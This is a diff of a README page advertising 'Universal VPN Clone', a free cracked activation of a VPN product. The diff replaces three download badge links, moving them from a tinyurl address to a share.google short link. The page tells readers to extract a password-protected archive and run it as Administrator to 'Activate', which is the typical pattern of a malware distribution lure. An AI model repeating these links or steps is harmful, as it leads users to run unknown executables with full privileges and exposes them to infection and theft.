@@ -9,7 +9,7 @@
 
 <div align="center">
 
-[![Download Universal VPN Clone](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/universal-vpn-clone)
+[![Download Universal VPN Clone](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/xnkuEhHTxjxzVod3v)
 
 </div>
 
@@ -104,7 +104,7 @@
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Click "Activate" → Launch Universal VPN Clone
 
-[![Download Universal VPN Clone](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/universal-vpn-clone)
+[![Download Universal VPN Clone](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/xnkuEhHTxjxzVod3v)
 
 ### Detailed Instructions (May 2026)
 
@@ -230,7 +230,7 @@ Get full access to universal VPN features for free. **Universal VPN Clone** unlo
 
 <div align="center">
 
-[![Download Universal VPN Clone](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/universal-vpn-clone)
+[![Download Universal VPN Clone](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://share.google/xnkuEhHTxjxzVod3v)
 
 **Version 4.6.1** — Free Universal VPN activation. May 2026. Zero cost. No payment.
 
